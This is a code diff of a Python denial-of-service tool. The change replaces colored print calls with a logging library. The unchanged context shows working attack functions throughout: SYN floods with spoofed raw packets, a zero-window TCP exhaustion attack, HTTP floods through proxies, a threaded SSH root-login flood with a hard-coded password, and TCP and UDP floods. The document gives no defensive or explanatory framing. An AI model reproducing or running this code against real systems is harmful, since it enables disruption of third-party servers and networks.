@@ -10,6 +10,7 @@ from urllib.request import Request
 from paramiko import SSHClient
 import impacket.ImpactPacket
 import warnings
+from loguru import logger
 
 from paramiko.client import AutoAddPolicy
 from scapy.layers.inet import TCP, IP
@@ -22,7 +23,7 @@ CONFIG = {
     'log': 1,
 }
 
-
+# 取conf文件
 def setConfValue(key, value):
     with open("./CONF/HTS.conf", 'w+') as f:
         nconf = json.load(f)
@@ -62,7 +63,7 @@ def synAttack(urip, sourceport, tgtip, tgtport, thread):
     noPolIp = str(tgtip).replace('https://', '').replace('http://', '')
     tgtip = gethostbyname(noPolIp)
     warnings.filterwarnings("ignore")
-    colormsg("Start Thread", 'yellow')
+    logger.info("Start Thread", 'yellow')
 
     def get(urip, sourceport, tgtip, tgtport):
         while True:
@@ -86,9 +87,9 @@ def synAttack(urip, sourceport, tgtip, tgtport, thread):
                 s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
                 s.sendto(ip.get_packet(), (f"{tgtip}", int(tgtport)))
 
-                colormsg(f"SUCCESS", 'green')
+                logger.info(f"SUCCESS", 'green')
             except Exception as e:
-                colormsg(f"FAILED.{e}", 'red')
+                logger.error(f"FAILED.{e}", 'red')
             finally:
                 sleep(0)
 
@@ -105,7 +106,7 @@ def randomSynPort():
 
 
 def sockFullAttack(tgtip, tgtport, thread):
-    colormsg("Start Thread", 'yellow')
+    logger.info("Start Thread", 'yellow')
 
     def get(tgtip, tgtport):
         while True:
@@ -115,9 +116,9 @@ def sockFullAttack(tgtip, tgtport, thread):
                 response = sr1(IP(dst=tgtip) / TCP(sport=xport, dport=tgtport, flags="S"), timeout=1, verbose=0)
                 send(IP(dst=tgtip) / TCP(dport=tgtport, sport=xport, window=0, flags="A",
                                          ack=(response[TCP].seq + 1)) / '\x00\x00', verbose=0)
-                colormsg(f"SUCCESS", 'green')
+                logger.info(f"SUCCESS", 'green')
             except Exception as e:
-                colormsg(f"FAILED.{e}", 'red')
+                logger.error(f"FAILED.{e}", 'red')
             finally:
                 sleep(0)
 
@@ -128,8 +129,9 @@ def sockFullAttack(tgtip, tgtport, thread):
 def synAttackBetter(srcip, tgtip, thread):
     def get(srcip, tgtip):
 
+
         tgtip = gethostbyname(str(tgtip).replace('https://', '').replace('http://', ''))
-        colormsg(f'Start thread', 'yellow')
+        logger.info(f'Start thread', 'yellow')
         while True:
             try:
                 srcIP = str(srcip)
@@ -140,10 +142,10 @@ def synAttackBetter(srcip, tgtip, thread):
                 send(packet)
 
             except Exception as e:
-                colormsg(f'FAILED.{e}', 'red')
+                logger.error(f'FAILED.{e}', 'red')
             finally:
                 sleep(0)
-            colormsg(f'SUCCESS', 'green')
+            logger.info(f'SUCCESS', 'green')
 
     for i in range(1, thread + 1):
         _thread.start_new_thread(get, (srcip, tgtip))
@@ -212,7 +214,7 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
     }
 
     def get(page, headers: dict):
-        colormsg("Start thread", 'yellow')
+        logger.info("Start thread", 'yellow')
         fn = 0
         if failnum != -1:
             fn = 0
@@ -223,9 +225,9 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
             while fn <= failnum:
                 try:
                     request.urlopen(req).read()
-                    colormsg("Success", "green")
+                    logger.info("Success", "green")
                 except Exception as e:
-                    colormsg(f"Failed.{e}", 'red')
+                    logger.warning  (f"Failed.{e}", 'red')
                     fn += 1
         else:
             while fn <= failnum:
@@ -234,11 +236,11 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
                     opener = request.build_opener(proxy_handler)
 
                     opener.open(req).read()
-                    colormsg("Success", 'green')
+                    logger.info("Success", 'green')
                 except Exception as e:
-                    colormsg(f"Failed.{e}", 'red')
+                    logger.error(f"Failed.{e}", 'red')
                     fn += 1
-        colormsg(f"ATK END", 'yellow')
+        logger.info(f"ATK END", 'yellow')
         return
 
     for a in host:
@@ -248,7 +250,7 @@ def sendPacketAttack(host: list, thread: int, failnum: int = 15):
 
 
 def sshAttack(host, port, thread):
-    colormsg("Thread Start!", "yellow")
+    logger.info("Thread Start!", "yellow")
 
     def get(host, port):
         host = gethostbyname(host)
@@ -259,11 +261,11 @@ def sshAttack(host, port, thread):
                 try:
                     ssh.load_system_host_keys()
                 except:
-                    colormsg('请获取SSH的Host Key或安装SSH','red')
+                    logger.warning('请获取SSH的Host Key或安装SSH','red')
                 ssh.connect(hostname=host, port=port, username="root", password='1145141919810FUCKU')
-                colormsg("Success", 'green')
+                logger.info("Success", 'green')
             except Exception as e:
-                colormsg(f"Failed.{e}", 'red')
+                logger.warning(f"Failed.{e}", 'red')
             finally:
                 sleep(0)
                 ssh.close()
@@ -274,7 +276,7 @@ def sshAttack(host, port, thread):
 
 def tcpAttack(host: tuple, thread: int, num: int = 50):
     host1 = host
-    colormsg("Thread Start!", "yellow")
+    logger.info("Thread Start!", "yellow")
 
     def sP(host, port):
         while 1:
@@ -285,11 +287,11 @@ def tcpAttack(host: tuple, thread: int, num: int = 50):
                 s.send((
                     "" * num).encode(
                     'utf-8'))
-                colormsg("Success", 'green')
+                logger.info("Success", 'green')
 
 
             except Exception as e:
-                colormsg(f"Failed.{e}", 'red')
+                logger.warning(f"Failed.{e}", 'red')
 
             sleep(0)
 
@@ -298,7 +300,7 @@ def tcpAttack(host: tuple, thread: int, num: int = 50):
 
 
 def udpAttack(ip, port, thread: int):
-    colormsg("Thread Start!", "yellow")
+    logger.info("Thread Start!", "yellow")
 
     def get(ip, port):
         while 1:
@@ -306,10 +308,10 @@ def udpAttack(ip, port, thread: int):
 
             try:
                 s.sendto(("AAa" * 10240).encode('Utf-8'), (ip, int(port)))
-                colormsg("Success", 'green')
+                logger.info("Success", 'green')
 
             except Exception as e:
-                colormsg(f"Failed.{e}", 'red')
+                logger.warning(f"Failed.{e}", 'red')
             sleep(0)
 
     for i in range(1, thread + 1):
